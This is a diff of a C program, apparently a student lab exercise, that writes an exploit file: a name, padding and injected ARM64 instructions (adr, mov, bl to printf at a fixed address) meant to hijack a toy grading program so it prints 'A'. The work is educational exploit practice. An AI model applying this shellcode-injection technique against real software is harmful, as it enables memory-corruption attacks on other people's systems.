@@ -32,17 +32,21 @@ int main(void)
        fprintf(psFile, "%c", psName[i]);
    }
    fprintf(psFile, "%c", 0x00);
-   fprintf(psFile, "%c", 'A');
-   fprintf(psFile, "%c", 0x00);
+   fprintf(psFile, "%c", '%');
+   fprintf(psFile, "%c", 'c');
    fprintf(psFile, "%c", 0x00);
 
-   /* Writes the instruction adr w0, "A" */
+   /* Writes the instruction adr w0, "%c" */
    uiInstr = MiniAssembler_adr(0, 0x42005D, 0x420060);
    fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
 
-   /* Writes the instruction bl puts - SUB ONCE BUG FIXED */
+    /* Writes the instruction mov w0, ‘A’ */
+   uiInstr = MiniAssembler_mov(1, 'A');
+   fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
+
+   /* Writes the instruction bl printf("%c", 'A') */
    /*uiInstr = MiniAssembler_bl(0x400600, 0x420064);*/
-   uiInstr = MiniAssembler_bl(0x4005e0, 0x420064);
+   uiInstr = MiniAssembler_bl(0x400600, 0x420064);
    fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
 
    /* Writes the instruction mov w0, ‘+’ */
